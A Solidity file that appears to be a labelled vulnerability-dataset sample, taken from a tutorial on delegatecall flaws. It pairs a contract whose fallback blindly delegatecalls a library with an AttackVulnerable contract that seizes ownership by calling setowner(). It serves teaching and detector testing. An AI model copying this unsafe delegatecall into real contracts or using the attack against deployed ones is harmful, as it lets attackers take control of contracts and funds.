/*
 * @source: https://docs.celo.org/blog/tutorials/solidity-vulnerabilities-delegated-call
 * @author: -
 * @vulnerable_at_lines: 35
 */

pragma solidity ^0.8.13;
/*
1. OwnerA deploys Lib
2. OwnerA deploys Vulnerable with the address of Lib
3. Attacker deploys AttackVulnerable with the address of Vulnerable
4. Attacker calls AttackVulnerable.attack()
5. Attack is now the owner of Vulnerable
*/

contract Lib {
    address public owner;

    function setowner() public {
        owner = msg.sender;
    }
}

contract Vulnerable {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        // <yes> <report> unsafe delegatecall
        address(lib).delegatecall(msg.data);
    }
}

// this contract is used to attack Vulnerable contract
contract AttackVulnerable {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public {
        vulnerable.call(abi.encodeWithSignature("setowner()"));
    }
}